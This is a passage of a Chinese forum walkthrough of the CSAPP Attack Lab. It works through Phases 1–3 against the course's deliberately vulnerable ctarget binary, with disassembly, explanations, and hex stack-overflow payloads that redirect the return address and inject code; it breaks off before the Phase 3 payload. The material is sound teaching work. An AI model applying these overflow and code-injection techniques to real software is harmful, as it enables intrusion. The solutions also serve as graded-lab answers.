
# [原创] 《深入理解计算机系统》Attack Lab 题解

- 原帖: https://www.52pojie.cn/forum.php?mod=viewthread&tid=2034829
- 抓取时间: 2026-11-01T22:09:00

## 前言

阅读此篇题解需要有 CSAPP 第三章基础，对于基本汇编指令本文不做过多说明。尝试 `Lab` 前应先下载官方提供的 [attacklab.pdf](https://csapp.cs.cmu.edu/3e/attacklab.pdf) 并在开始每一阶段前阅读相应内容，否则容易一头雾水。

注意，因为我们是在本地运行 `Lab`，所以运行程序时要加上参数 `-q`，告诉程序不上数据传到伺服器，否则无法运行。

笔者学识稍浅，若有疏漏或错误处，欢迎各位大佬指正。

## Phase_1

文档给了 `test` 函数的 C 代码：

```
void test()
{
    int val;
    val = getbuf();
    printf("No exploit. Getbuf returned 0x%x\n", val);
}
```

还给了 `touch1` 函数的代码：

```
void touch1()
{
    vlevel = 1; /* Part of validation protocol */
    printf("Touch1!: You called touch1()\n");
    validate(1);
    exit(0);
}
```

题目要求当 `getbuf` 返回时不返回到下一行的 `printf`，而是跳转到 `touch1` 运行。

首先查看 `getbuf` 的反汇编代码：

```
00000000004017a8 :
  4017a8:   48 83 ec 28             sub    $0x28,%rsp
  4017ac:   48 89 e7                mov    %rsp,%rdi
  4017af:   e8 8c 02 00 00          callq  401a40 
  4017b4:   b8 01 00 00 00          mov    $0x1,%eax
  4017b9:   48 83 c4 28             add    $0x28,%rsp
  4017bd:   c3                      retq   
  4017be:   90                      nop
  4017bf:   90                      nop
```

`0x4017a8` 处指令开辟了大小 `0x28 = 40`（字节）的栈空间，然后将栈顶作为参数（`%rdi`）传给 `Gets` 函数。

我们需要在输入时输入 48 字节的内容让栈溢出，使返回地址被覆盖为 `touch1` 的内存地址。

```
00000000004017c0 :
  4017c0:   48 83 ec 08             sub    $0x8,%rsp
  4017c4:   c7 05 0e 2d 20 00 01    movl   $0x1,0x202d0e(%rip)        # 6044dc 
  4017cb:   00 00 00 
  4017ce:   bf c5 30 40 00          mov    $0x4030c5,%edi
  4017d3:   e8 e8 f4 ff ff          callq  400cc0 
  4017d8:   bf 01 00 00 00          mov    $0x1,%edi
  4017dd:   e8 ab 04 00 00          callq  401c8d 
  4017e2:   bf 00 00 00 00          mov    $0x0,%edi
  4017e7:   e8 54 f6 ff ff          callq  400e40 
```

查看代码我们可以发先 `touch1` 首行指令在地址 `0x4017c0` 处，这是我们想让代码从 `getbuf` 返回的地址。（注意，因为机器采小端序，在输入时应输入 `C0 17 40 00`）

由此，我们可以构建出 `shellcode`：

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
C0 17 40 00
```

我们将这段内容保存在档案 `phase_1` 中，然后使用 lab 提供的工具 `hex2raw` 将其转换成程序接受的 `string` 类型。

注意，运行 `ctarget` 前要加上 `-q`，防止因为程序连接不上伺服器而报错。

```
./hex2raw
```

![](https://attach.52pojie.cn/forum/202505/28/180321enji9vj9ninfxvjn.png)

1.png (99.81 KB, 下载次数: 0)

[forum.php?mod=attachment&aid=Mjc3OTc2N3w4YzM5YmRhN3wxNzkzNTcwOTM3fDE2ODA4NnwyMDM0ODI5&nothumb=yes](https://www.52pojie.cn/forum.php?mod=attachment&aid=Mjc3OTc2N3w4YzM5YmRhN3wxNzkzNTcwOTM3fDE2ODA4NnwyMDM0ODI5&nothumb=yes)

2025-5-28 18:03 上传

## Phase_2

查看文档，发现给出的 `touch2` 函数要求传入一个无符号数，并检查该输入是否与 `cookie` 相等。

```
void touch2(unsigned val) {
    vlevel = 2;
    if (val == cookie) {
        printf("Touch2!: You called touch2(0x%.8x)\n", val);
        validate(2);
    }
    else {
        printf("Misfire: You called touch2(0.x%8x)\n", val);
        fail(2);
    }
    exit(0);
}
```

```
00000000004017ec :
  4017ec:   48 83 ec 08             sub    $0x8,%rsp
  4017f0:   89 fa                   mov    %edi,%edx
  4017f2:   c7 05 e0 2c 20 00 02    movl   $0x2,0x202ce0(%rip)        # 6044dc 
  4017f9:   00 00 00 
  4017fc:   3b 3d e2 2c 20 00       cmp    0x202ce2(%rip),%edi        # 6044e4 
  401802:   75 20                   jne    401824 
  401804:   be e8 30 40 00          mov    $0x4030e8,%esi
  401809:   bf 01 00 00 00          mov    $0x1,%edi
  40180e:   b8 00 00 00 00          mov    $0x0,%eax
  401813:   e8 d8 f5 ff ff          callq  400df0 
  401818:   bf 02 00 00 00          mov    $0x2,%edi
  40181d:   e8 6b 04 00 00          callq  401c8d 
  401822:   eb 1e                   jmp    401842 
  401824:   be 10 31 40 00          mov    $0x403110,%esi
  401829:   bf 01 00 00 00          mov    $0x1,%edi
  40182e:   b8 00 00 00 00          mov    $0x0,%eax
  401833:   e8 b8 f5 ff ff          callq  400df0 
  401838:   bf 02 00 00 00          mov    $0x2,%edi
  40183d:   e8 0d 05 00 00          callq  401d4f 
  401842:   bf 00 00 00 00          mov    $0x0,%edi
  401847:   e8 f4 f5 ff ff          callq  400e40 
```

首先查看代码可以知道 `touch2` 函数开头地址为 `0x4017ec`。在 `Lab` 文件夹内有一个文件叫 `cookie.txt`，里面存放着我们需要的 `cookie` 值。

![](https://attach.52pojie.cn/forum/202505/28/180323hbxg2uu2x0iq2i5u.png)

2.png (4.88 KB, 下载次数: 1)

[forum.php?mod=attachment&aid=Mjc3OTc2OHw4YzU3NWM4Y3wxNzkzNTcwOTM3fDE2ODA4NnwyMDM0ODI5&nothumb=yes](https://www.52pojie.cn/forum.php?mod=attachment&aid=Mjc3OTc2OHw4YzU3NWM4Y3wxNzkzNTcwOTM3fDE2ODA4NnwyMDM0ODI5&nothumb=yes)

2025-5-28 18:03 上传

因为我们要将 `cookie` 值传给 `touch2`，回想 CSAPP 第三章内容可以知道，函数的第一个参数存放在 `%rdi` 中。所以我们需要执行以下代码：

```
movq $0x59b997fa, %rdi
```

然后我们要调用 `touch2` 函数，即 `0x4017ec` 地址处。这里我们不使用 `call` 或 `jmp` 而使用 `ret`，因为偏移不好计算。注意，`ret` 指令会跳转到栈顶保存的地址，并将该地址出栈（`pop`）。

```
pushq $0x4017ec
ret
```

将三行汇编代码结合在一起，就成功达成调用函数的功能了。我们将这段代码保存在 `phase_2_asm.s` 中，然后使用指令：

```
gcc -c phase_2_asm.s
objdump -d phase_2_asm > phase_2_asm.asm
```

打开 `phase_2_asm.asm`，可以发现对应的机器代码。

```
phase_2_asm.o:     file format elf64-x86-64

Disassembly of section .text:

0000000000000000 :
   0:   48 c7 c7 fa 97 b9 59    mov    $0x59b997fa,%rdi
   7:   68 ec 17 40 00          pushq  $0x4017ec
   c:   c3                      retq   
```

即：

```
48 c7 c7 fa 97 b9 59 68
ec 17 40 00 c3 
```

有这些还不够，因为这些数据在输入后会被储存在栈中，所以会被视为数据而非代码的一部份。所以我们利用栈溢出将栈中原本的储存地址覆盖成栈顶（用户输入数据的存储起始点）的位置，即可让该段代码被值行。（即将 `%rip` 设置为 `%rsp`）

通过 `gdb` 查看，我们可以发现用户输入数据的存储起始点在 `0x5561dc78` 处。

![](https://attach.52pojie.cn/forum/202505/28/180325c0egjkv80e2aw3jn.png)

3.png (282.63 KB, 下载次数: 0)

[forum.php?mod=attachment&aid=Mjc3OTc2OXxhYmUwMWFlOXwxNzkzNTcwOTM3fDE2ODA4NnwyMDM0ODI5&nothumb=yes](https://www.52pojie.cn/forum.php?mod=attachment&aid=Mjc3OTc2OXxhYmUwMWFlOXwxNzkzNTcwOTM3fDE2ODA4NnwyMDM0ODI5&nothumb=yes)

2025-5-28 18:03 上传

利用 0 填充空间后，我们可以构建出 `shellcode` 并将其保存在 `phase_2` 中：

```
48 c7 c7 fa 97 b9 59 68
ec 17 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55
```

利用以下代码验证其正确性：

```
./hex2raw
```

![](https://attach.52pojie.cn/forum/202505/28/180327x1l0xb4zqbd13l3a.png)

4.png (112.74 KB, 下载次数: 0)

[forum.php?mod=attachment&aid=Mjc3OTc3MHw1NTRlMTQ1YnwxNzkzNTcwOTM3fDE2ODA4NnwyMDM0ODI5&nothumb=yes](https://www.52pojie.cn/forum.php?mod=attachment&aid=Mjc3OTc3MHw1NTRlMTQ1YnwxNzkzNTcwOTM3fDE2ODA4NnwyMDM0ODI5&nothumb=yes)

2025-5-28 18:03 上传

## Phase_3

查看文档，发现这题需要给 `hexmatch` 函数传入一个等于 `cookie` 的字符串，其中字符串应传入首字符的地址（`char *`）。

```
int hexmatch(unsigned val, char *sval) {
    char cbuf[110];
    char *s = cbuf + random() % 100;
    sprintf(s, "%.8x", val);
    return strncmp(sval, s, 9) == 0;
}
```

```
void touch3(char *sval) {
    vlevel = 3;
    if (hexmatch(cookie, sval)) {
        printf("Touch3!: You called touch3(\"%s\")\n", sval);
        validate(3);
    }
    else {
        printf("Misfire: You called touch3(\"%s\")\n", sval);
        fail(3);
    }
    exit(0);
}
```

首先查看 `touch3` 的地址：`0x4018fa`。`cookie` 的值在 `phase_2` 就找到过了：`0x59b997fa`。文档中说明传入的 `cookie` 字符串不应包含前缀的 `0x`，所以实际要传入的字符串应为：`59b997fa`。

注意，通过查看文档，我们可以发现一句话：“When functions `hexmatch` and `strncmp` are called, they push data onto the stack, overwriting portions of memory that held the buffer used by `getbuf`. As a result, you will need to be careful where you place the string representation of your `cookie`。”即当 `hexmatch` 和 `strncmp` 被调用时会将数据入栈，可能会覆盖 `getbuf` 的部分内容，需要小心选择字符串储存地址。

意即避免将字符串存放在 `getbuf` 的栈帧内，故此我们选择将其存放在 `test` 的栈帧内。

![](https://attach.52pojie.cn/forum/202505/28/180328fg5jlgngnlng15tg.png)

5.png (210.12 KB, 下载次数: 0)

[forum.php?mod=attachment&aid=Mjc3OTc3MXwxNzhmM2UwZHwxNzkzNTcwOTM3fDE2ODA4NnwyMDM0ODI5&nothumb=yes](https://www.52pojie.cn/forum.php?mod=attachment&aid=Mjc3OTc3MXwxNzhmM2UwZHwxNzkzNTcwOTM3fDE2ODA4NnwyMDM0ODI5&nothumb=yes)

2025-5-28 18:03 上传

查看 `test` 的栈底：`0x5561dca8`。

参考 `phase_2` 我们可以编写出以下汇编代码，并将其转换为机器代码：

```
0000000000000000 :
    0:  48 c7 c7 a8 dc 61 55    mov    $0x5561dca8,%rdi
    7:  68 fa 18 40 00          pushq  $0x4018fa
    c:  c3                      retq  
```

到目前为止，我们可以写出以下与 `phase_2` 雷同的 `shellcode`：
